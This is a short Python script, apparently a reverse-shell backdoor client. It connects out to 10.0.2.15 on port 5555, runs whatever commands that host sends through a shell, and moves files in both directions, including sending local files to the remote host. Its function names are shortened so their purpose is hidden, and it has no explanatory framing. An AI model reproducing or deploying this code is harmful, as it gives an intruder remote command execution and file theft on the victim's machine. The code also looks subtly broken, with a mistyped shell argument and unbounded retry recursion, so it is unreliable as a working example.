import socket
import time
import subprocess
import json
import os

def r_s(d):
    j = json.dumps(d)
    s.send(j.encode())

def r_r():
    d = ''
    while True:
        try:
            d = d + s.recv(1024).decode().rstrip()
            return json.loads(d)
        except ValueError:
            continue

def c():
	while True:
		time.sleep(10)
		try:
			s.connect(('10.0.2.15',5555))
			sh()
			s.close()
			break
		except:
			c()

def u_f(file_name):
	f = open(file_name, 'rb')
	s.send(f.read())

def d_f(file_name):
    f = open(file_name, 'wb')
    s.settimeout(1)
    ck = s.recv(1024)
    while ck:
        f.write(ck)
        try:
            ck = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()

def sh():
	while True:
		cd = r_r()
		if cd == 'quit':
			break
		elif cd == 'clear':
			pass
		elif cd[:3] == 'cd ':
			os.chdir(cd[3:])
		elif cd[:8] == 'download':
			u_f(cd[9:])
		elif cd[:6] == 'upload':
			d_f(cd[7:])
		else:
			execute = subprocess.Popen(cd, sh=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			r = execute.stdout.read() + execute.stderr.read()
			r = r.decode()
			r_s(r)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c()